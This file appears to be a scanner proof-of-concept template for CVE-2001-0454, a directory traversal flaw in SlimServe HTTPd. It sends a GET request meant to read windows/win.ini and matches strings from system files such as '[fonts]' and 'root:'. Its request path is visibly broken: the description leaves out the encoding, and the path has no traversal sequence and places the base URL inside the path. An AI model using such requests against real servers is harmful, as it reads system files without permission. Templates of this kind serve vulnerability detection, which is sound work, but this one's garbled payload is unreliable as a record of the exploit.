[info]
author = "AVE"
description = "检测 WhitSoft SlimServe HTTPd 1.0/1.1 目录遍历漏洞，通过发送  编码的路径遍历请求读取服务器文件"
id = "POC-AVE-2001-0181"
name = "CVE-2001-0454 PoC"
severity = "medium"
tags = ["cve-2001-0454"]
vuln_id = [
    "CVE-2001-0454",
    "AVE-2001-0181",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}///////windows/win.ini"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "[fonts]",
    "[extensions]",
    "[Mail]",
    "[Compatibility]",
    "root:",
]
